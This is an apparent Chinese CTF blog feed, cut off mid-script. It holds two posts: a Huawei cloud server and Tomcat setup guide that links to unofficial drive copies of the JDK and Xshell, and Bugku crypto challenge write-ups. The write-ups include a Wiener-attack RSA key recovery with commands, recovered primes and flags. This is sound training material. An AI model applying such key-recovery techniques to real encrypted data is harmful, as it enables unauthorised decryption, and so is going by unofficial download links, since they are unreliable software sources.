<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ChanCherry&#39;s Blog</title>
  
  <subtitle>信安萌新，CTFer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-09T10:09:36.210Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ChanCherry</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>华为云服务器（linux系统）完整配置流程（包含jdk,Tomcat,网页配置等）</title>
    <link href="http://yoursite.com/2020/04/09/%E5%8D%8E%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88linux%E7%B3%BB%E7%BB%9F%EF%BC%89%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%E6%B5%81%E7%A8%8B%EF%BC%88%E5%8C%85%E5%90%ABjdk%E3%80%81Tomcat%E9%85%8D%E7%BD%AE%E3%80%81%E7%BD%91%E9%A1%B5%E9%85%8D%E7%BD%AE%E7%AD%89%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/09/%E5%8D%8E%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88linux%E7%B3%BB%E7%BB%9F%EF%BC%89%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%E6%B5%81%E7%A8%8B%EF%BC%88%E5%8C%85%E5%90%ABjdk%E3%80%81Tomcat%E9%85%8D%E7%BD%AE%E3%80%81%E7%BD%91%E9%A1%B5%E9%85%8D%E7%BD%AE%E7%AD%89%EF%BC%89/</id>
    <published>2020-04-08T16:00:00.000Z</published>
    <updated>2020-04-09T10:09:36.210Z</updated>
    
    <content type="html"><![CDATA[<p>去年华为云服务器做活动，白嫖了一个弹性云服务器，一直没有用，今天着手来配置一下，不然要过期了。一边配置一边记录流程，亲测有效哦！</p><a id="more"></a><p>首先，需要安装一个远程登陆软件Xshell，可以去<a href="http://www.netsarang.com/download/main.html" target="_blank" rel="noopener">官网</a>下载，也可以找免费的版本。</p><p>华为的云服务器的端口是默认全部打开的，区别于阿里云，阿里云的端口需要自己去打开，两者各有利弊。在华为云控制台修改好密码就可以使用Xshell远程连接使用了。<br><img src="https://img-blog.csdnimg.cn/20200317144609181.png" alt="在这里插入图片描述"><br>打开Xshell，文件-&gt;新建-&gt;填写名称（容易辨别就行）和主机（云服务器的公网IP），其余内容可不变。<br><img src="https://img-blog.csdnimg.cn/2020031714472592.png" alt="在这里插入图片描述"><br>然后双击左边建好的会话名称，就会出现输入用户名（root）和密码（刚刚重置过的），SSH远程登陆云服务器。<br><img src="https://img-blog.csdnimg.cn/20200317145038719.png" alt="在这里插入图片描述"><br>如果出现SSH服务器拒绝了密码，就需要改<code>sshd_config</code>。<br><img src="https://img-blog.csdnimg.cn/20200317145534362.png" alt="在这里插入图片描述"><br>1.点击远程登录，使用屏幕上提示的用户名和密码登录，我的用户名为root，密码就是之前重置的。</p><p>2.输入<code>sudo vi /etc/ssh/sshd_config</code>，然后按<code>a</code>键或者<code>Insert</code>键，找到内容为<code>PasswordAuthentication</code>由<code>no</code>改为<code>yes</code>，改好后按<code>ESC</code>键，再输入<code>:wq</code>保存退出。<br><img src="https://img-blog.csdnimg.cn/20200317145945528.png" alt="在这里插入图片描述"><br>3.输入<code>sudo service sshd reload</code>或<code>sudo service sshd restart</code>重启<code>sshd</code></p><p>左上角小点点由红色代表绿色就说明连接上了，界面里面也会出现一些相关提示语最后登陆时间什么时候啥的，这说明你已经远程连接成功了。登录成功页面如下：<br><img src="https://img-blog.csdnimg.cn/20200317174253787.png" alt="在这里插入图片描述"><br>之后就可以安装一个网站服务器了，可以选择Nginx和Apache，这里选择Apache。<br>（PS：肯定有很多小伙伴会看到有些这里是用Tomcat部署Java Web项目，我看到时也比较困惑。简单来说，Apache是Web应用服务器，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等，如果要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Apache转发给Tomcat处理。；Tomcat是应用（Java）服务器，它只是一个Servlet(JSP也翻译成Servlet)容器，可以认为是Apache的扩展，但是可以独立于Apache运行。具体二者的区别可见<a href="https://www.php.cn/apache/427666.htmlhttps://www.php.cn/apache/427666.html" target="_blank" rel="noopener">https://www.php.cn/apache/427666.html</a>）</p><p>下面是安装Java jdk和Tomcat流程：</p><ol><li><p>获取jdk，地址：<a href="https://pan.baidu.com/s/1OJyKcbFq8nM6zizvvG1EkA" target="_blank" rel="noopener">https://pan.baidu.com/s/1OJyKcbFq8nM6zizvvG1EkA</a>        提取码：1tq5</p></li><li><p>点击Xshell上的<code>新建文件传输</code>（如图），<br><img src="https://img-blog.csdnimg.cn/20200317185647738.png" alt="在这里插入图片描述"><br>如果你还没安装Xftp，它会提示你去官网安装，官网可以使用电子邮箱下载免费版本，然后根据它的提示一步一步来就好了。已安装好的请自行跳过。<br><img src="https://img-blog.csdnimg.cn/2020031718561397.png" alt="在这里插入图片描述"><br>或者你嫌麻烦，也可以用这个Xshell4：链接: <a href="https://pan.baidu.com/s/1wf1qg28PP8V5D1GRAbaqOQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1wf1qg28PP8V5D1GRAbaqOQ</a> 提取码: jfbq<br>（1）打开软件之后新建；<br>（2）主机写linux的公网IP，协议选择SFTP，端口号为22；<br>（3）用户名和密码为Linux的账户(root)和密码；<br><img src="https://img-blog.csdnimg.cn/20200317194005948.png" alt="在这里插入图片描述"><br>（4）填写完成之后点击确定，双击创建好的会话，连接到云服务器。软件里即显示本机的文件与Linux的文件，双击文件即可传递，非常方便。<br><img src="https://img-blog.csdnimg.cn/20200317194209504.png" alt="在这里插入图片描述"></p></li><li><p>上传jdk文件到linux服务器上，自己在usr下新建文件夹<code>/usr/software</code>，拖动压缩包文件上传</p></li><li><p>解压jdk压缩包：先用cd命令到达自己上一步创建的文件夹地址：<code>cd /usr/software</code>，再使用解压jdk压缩包命令：<code>tar -xvf jdk-8u65-linux-x64.tar.gz</code>（输入<code>jdk</code>后面可按<code>tab</code>键自动补全）。使用<code>mv jdk1.8.0_161 jdk1.8</code>命令，将<code>jdk1.8.0_161</code>重命名为<code>jdk1.8</code>(方便以后管理和使用)</p></li><li><p>解压完成后更改环境变量。输入命令<code>vi /etc/profile</code>，按<code>i</code>进入编辑模式，光标移到末尾添加以下文本：<code>export JAVA_HOME=/usr/software/jdk1.8 export JRE_HOME=/usr/software/jdk1.8/jre export PATH=$PATH:/usr/software/jdk1.8/bin export CLASSPATH=./:/usr/software/jdk1.8/lib:/usr/software/jdk1.8/jre/lib</code>，如不同，记得更改文件夹名与jdk名。完成后按<code>esc</code>，输入<code>:wq</code>保存并退出。</p></li><li><p>重启服务器。</p></li><li><p>输入<code>java -version</code>出现以下英文证明安装成功。<br><img src="https://img-blog.csdnimg.cn/20200317202014467.png" alt="在这里插入图片描述"></p></li><li><p>进入<a href="http://tomcat.apache.org/" target="_blank" rel="noopener">Tomcat官网</a>下载tomcat安装包，这里下载的是9.0.31版本的。<br><img src="https://img-blog.csdnimg.cn/20200317203226556.png" alt="在这里插入图片描述"></p></li><li><p>将tomcat压缩包通过Xftp上传到服务器<code>/usr/software</code>，后续操作就和上面的jdk类似了。</p></li><li><p>解压tomcat压缩包：<code>cd /usr/software</code>再使用解压缩包命令：<code>tar -xvf apache-tomcat-9.0.31.tar</code> （输入<code>apache</code>后面可按<code>tab</code>键自动补全） </p></li><li><p>解压完成后更改环境变量。输入命令<code>vi /etc/profile</code>，按<code>i</code>进入编辑模式，光标移到末尾添加以下文本（如有不同，记得改文件夹名称）：<code>export CATALINA_HOME=/usr/software/apache-tomcat-9.0.31</code>。完成后按<code>esc</code>，输入<code>:wq</code>保存并退出。</p></li><li><p>进入云服务器的控制台，进入安全组规则中，添加安全组规则，配置8080端口。<br><img src="https://img-blog.csdnimg.cn/20200317230417324.png" alt="在这里插入图片描述"></p></li><li><p>启动tomcat服务器。使用命令<code>cd /usr/software/apache-tomcat-9.0.31/bin</code>先进入tomcat文件夹的bin目录下，输入<code>./startup.sh</code>启动tomcat，成功页面如下：<br><img src="https://img-blog.csdnimg.cn/20200317224108983.png" alt="在这里插入图片描述"></p></li><li><p>接下来在浏览器输入自己的公网ip地址(没有改端口号的话，就在ip地址后加上:8080)，出现 tomcat 的主页，则证明tomcat配置启动成功<br><img src="https://img-blog.csdnimg.cn/2020031723060040.png" alt="在这里插入图片描述"></p></li></ol><p><strong>Tomcat的目录结构</strong>：<br><img src="https://img-blog.csdnimg.cn/20200317233215226.png" alt="在这里插入图片描述"><br><strong>Tomcat重启关闭</strong>：<br>1、Tomcat关闭命令<code>./shutdown.sh</code><br>2、查看Tomcat是否以关闭<code>ps -ef|grep java</code><br>3、如果显示以下相似信息，说明Tomcat还没有关闭<br><img src="https://img-blog.csdnimg.cn/20200317233722696.png" alt="在这里插入图片描述"><br>4、如果你想直接直接杀死Tomcat进程（进程号： 7010），可以使用kill命令 <code>kill -9 7010</code><br>5、然后<code>ps -ef|grep java</code>继续查看Tomcat是否关闭，</p><p>如果出现以下信息，则表示Tomcat已经关闭<br><img src="https://img-blog.csdnimg.cn/20200317233907274.png" alt="在这里插入图片描述"><br>6、最后，启动Tomcat，命令为<code>./startup.sh</code></p><p><strong>如果要部署自己的网页项目，将项目文件夹上传到 Tomcat文件夹下的 Webapps 文件夹里就行。上传好了后，浏览器访问即可。例如：http://云服务器公网ip地址:8080/index/one.html等。</strong>（Tomcat关闭之后输入IP地址等就不能访问你的项目了）</p><p><strong>注意，有个比较坑的地方，修改了server.xml文件的端口后，需要重启服务器，然后再运行程序。<br>如果你修改了对应项目的服务器的配置，那么请用你修改的端口号，而不是server.xml文件里的默认端口号。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年华为云服务器做活动，白嫖了一个弹性云服务器，一直没有用，今天着手来配置一下，不然要过期了。一边配置一边记录流程，亲测有效哦！&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件配置" scheme="http://yoursite.com/categories/%E8%BD%AF%E4%BB%B6%E9%85%8D%E7%BD%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>Bugku——加密wp</title>
    <link href="http://yoursite.com/2020/02/27/Bugku%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86wp/"/>
    <id>http://yoursite.com/2020/02/27/Bugku%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86wp/</id>
    <published>2020-02-26T16:00:00.000Z</published>
    <updated>2020-02-27T02:33:28.536Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：太久没刷题了，今天心血来潮一口气刷完了Bugku的加密（感觉拖了好久，拖延症晚期），下为wp。</p></blockquote><a id="more"></a><h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">N :</span> <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span></span><br><span class="line"><span class="attr">e :</span> <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line"></span><br><span class="line"><span class="attr">enc :</span> <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br></pre></td></tr></table></figure><p>可以看到e非常大，e非常大的时候可以使用wiener attack的方法进行破解，工具RsaCtfTool集成了wiener attack的方法，可以用RsaCtfTool计算私钥。具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;RsaCtfTool# python RsaCtfTool.py --createpub -n 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 -e 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 &gt; pub_key.pem</span><br><span class="line">root@kali:~&#x2F;RsaCtfTool# python RsaCtfTool.py --publickey pub_key.pem --private &gt; pub.key</span><br><span class="line">root@kali:~&#x2F;RsaCtfTool# python RsaCtfTool.py --key pub.key --dumpkey</span><br><span class="line">[*] n: 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">[*] e: 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">[*] d: 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">[*] p: 15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span><br><span class="line">[*] q: 28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span><br></pre></td></tr></table></figure><p>使用p,q,e解密密文，即可得到<code>flag{Wien3r_4tt@ck_1s_3AsY}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求最大公约数</span></span><br><span class="line"><span class="keyword">if</span> (a &lt; b):</span><br><span class="line">    a, b = b, a</span><br><span class="line"><span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">    temp = a % b</span><br><span class="line">    a = b</span><br><span class="line">    b = temp</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">g, x, y = egcd(a, m)</span><br><span class="line"><span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">p=<span class="number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span></span><br><span class="line">q=<span class="number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span></span><br><span class="line">e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line"><span class="comment"># tmp = base64.b64decode("qzogS7X8M3ZOpkUhJJcbukaRduLyqHAPblmabaYSm9iatuulrHcEpBmil7V40N7gbsQXwYx5EBH5r5V2HRcEIOXjgfk5vpGLjPVxBLyXh2DajHPX6KvbFpQ8jNpCQbUNq8Hst00yDSO/6ri9dk6bk7+uyuN0b2K1bNG5St6sCQ4qYEA3xJbsHFvMqtvUdhMiqO7tNCUVTKZdN7iFvSJqK2IHosIf7FqO24zkHZpHi31sYU7pcgYEaGkVaKs8pjq6nbnffr4URfoexZHeQtq5UAkr95zD6WgvGcxaTDKafFntboX9GR9VUZnHePiio7nJ3msfue5rkIbISjmGCAlj+w==")</span></span><br><span class="line">d = modinv(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="comment"># c=s2n(tmp)</span></span><br><span class="line">c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">n = p*q</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> (n2s(m))</span><br></pre></td></tr></table></figure><h1 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lf5&#123;ag024c483549d7fd@@<span class="number">1</span>&#125;</span><br><span class="line">一张纸条上凌乱的写着<span class="number">2</span> <span class="number">1</span> <span class="number">6</span> <span class="number">5</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>2</th><th>1</th><th>6</th><th>5</th><th>3</th><th>4</th></tr></thead><tbody><tr><td>l</td><td>f</td><td>5</td><td>{</td><td>a</td><td>g</td></tr><tr><td>0</td><td>2</td><td>4</td><td>c</td><td>4</td><td>8</td></tr><tr><td>3</td><td>5</td><td>4</td><td>9</td><td>d</td><td>7</td></tr><tr><td>f</td><td>d</td><td>@</td><td>@</td><td>1</td><td>}</td></tr></tbody></table><p>24个字符分为四组，按照 216534 的顺序进行读取，然后按照123456的顺序排序后组成序列，之后再进行对于栅栏加密的解密，4个字符为一组，写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str_ciphertext = <span class="string">"lf5&#123;ag024c483549d7fd@@1&#125;"</span></span><br><span class="line">str_temp = <span class="string">""</span></span><br><span class="line">key = <span class="string">"216534"</span></span><br><span class="line">str_plaintext = <span class="string">""</span></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> k &lt;= <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">for</span> j, elem <span class="keyword">in</span> enumerate(key):  <span class="comment"># j用来控制密文的下标，k控制顺序是123456</span></span><br><span class="line">        <span class="keyword">if</span> k == int(elem):</span><br><span class="line">            str_temp += str_ciphertext[j] + str_ciphertext[j + <span class="number">6</span>] + str_ciphertext[j + <span class="number">12</span>] + str_ciphertext[j + <span class="number">18</span>]</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(str_temp)  <span class="comment"># 栅栏密码，4个字符为一组，进行抽取，之后可以得到明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    str_plaintext += str_temp[i] + str_temp[i + <span class="number">4</span>] + str_temp[i + <span class="number">8</span>] + str_temp[i + <span class="number">12</span>] + str_temp[i + <span class="number">16</span>] + str_temp[i + <span class="number">20</span>]</span><br><span class="line">print(str_plaintext)</span><br></pre></td></tr></table></figure><p>得到flag{52048c453d794df1}@@，注意提交的时候去掉@@</p><h1 id="凯撒部长的奖励"><a href="#凯撒部长的奖励" class="headerlink" title="凯撒部长的奖励"></a>凯撒部长的奖励</h1><blockquote><p>就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}<br>题目来源：第七季极客大挑战</p></blockquote><p>凯撒密码解密：<br><img src="https://img-blog.csdnimg.cn/20200226163009834.png" alt="在这里插入图片描述"><br>注意本题来源”极客大挑战“，因此其答案格式是”SYC{}“。<br>SYC{here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us}</p><h1 id="一段Base64"><a href="#一段Base64" class="headerlink" title="一段Base64"></a>一段Base64</h1><p>将base64编码复制粘贴到Converter这个软件里面。<br><img src="https://img-blog.csdnimg.cn/20200226171537692.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226171549578.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226171601670.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226171614213.png" alt="在这里插入图片描述"><br>把输出中的参数复制到输入，<br><img src="https://img-blog.csdnimg.cn/20200226171626884.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226171714157.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226171732473.png" alt="在这里插入图片描述"><br>%7B和%7D是url编码，解出来就是{}</p><h1 id=""><a href="#" class="headerlink" title=".!?"></a>.!?</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...</span><br><span class="line">..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?.</span><br><span class="line">..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !?.?! .?!.? ..... ....! ?!!.? ..... ...?. ?!.?. ..... !.?.. .....</span><br><span class="line">!?!!. ?!!!! !!?.? !.?!! !!!!! !!!!. ..... ...!. ?.... ...!? !!.?. .....</span><br><span class="line">?.?!. ?..!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? .....</span><br><span class="line">..!?! !.?.. ....? .?!.? ....! .!!!. !!!!! !!!!! !!!!! !!.?. ..... .!?!!</span><br><span class="line">.?... ...?. ?!.?. ..... !.!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?!</span><br><span class="line">.?... ..... !.?.</span><br></pre></td></tr></table></figure><p>bugku工具解密一下就好了，附上链接：<a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">https://tool.bugku.com/brainfuck/</a><br><img src="https://img-blog.csdnimg.cn/20200226175831760.png" alt="在这里插入图片描述"></p><h1 id="-1"><a href="#-1" class="headerlink" title="+[]-"></a>+[]-</h1><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;++ ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> ++<span class="literal">+</span>&lt;<span class="title">]</span> &gt;++<span class="string">.</span><span class="literal">+</span> ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span>&lt;++<span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;-- <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="string">.</span>++<span class="literal">+</span> ++<span class="literal">+</span><span class="string">.</span>&lt;</span><br><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;++<span class="literal">+</span> <span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">+</span> ++<span class="literal">+</span><span class="string">.</span>&lt; ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;-- --<span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="string">.</span>&lt;++ ++<span class="title">[</span><span class="literal">-</span>&gt; ++<span class="literal">+</span><span class="literal">+</span>&lt; <span class="title">]</span>&gt;++<span class="literal">+</span> <span class="string">.</span>&lt;++<span class="literal">+</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span>&gt;-- <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span> --<span class="literal">-</span><span class="literal">-</span><span class="string">.</span> ++<span class="literal">+</span><span class="literal">+</span><span class="string">.</span> &lt;++<span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;++<span class="literal">+</span> &lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="string">.</span> &lt;++<span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;-- --&lt;<span class="title">]</span>&gt; --<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="string">.</span>&lt;++</span><br><span class="line"><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span> ++&lt;<span class="title">]</span>&gt; ++<span class="string">.</span><span class="literal">-</span><span class="string">.</span> --<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> --<span class="literal">-</span><span class="string">.</span>&lt; ++<span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;++<span class="literal">+</span>&lt; <span class="title">]</span>&gt;++<span class="literal">+</span> <span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span> <span class="string">.</span>&lt;++<span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;-- <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span></span><br><span class="line"><span class="string">.</span>&lt;++<span class="literal">+</span> ++<span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;--<span class="literal">-</span><span class="literal">-</span> --&lt;<span class="title">]</span>&gt; --<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> --<span class="literal">-</span><span class="literal">-</span><span class="string">.</span> <span class="literal">+</span><span class="string">.</span>&lt;++ ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span> ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> ++&lt;<span class="title">]</span>&gt; ++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span></span><br><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span>&lt;</span><br></pre></td></tr></table></figure><p>同样还是bugku工具，<br><img src="https://img-blog.csdnimg.cn/20200226180019257.png" alt="在这里插入图片描述"></p><h1 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h1><blockquote><p>突然天上一道雷电 gndk€rlqhmtkwwp}z</p></blockquote><p>脑洞！！！<br>g n d k四个字符的ASCII码是103 110 100 107，<br>f l a g四个字符的ASCII码是102 108 97 103<br>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret=<span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">temp=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">    i=ord(i)-temp</span><br><span class="line">    print(chr(i),end=<span class="string">""</span>)</span><br><span class="line">    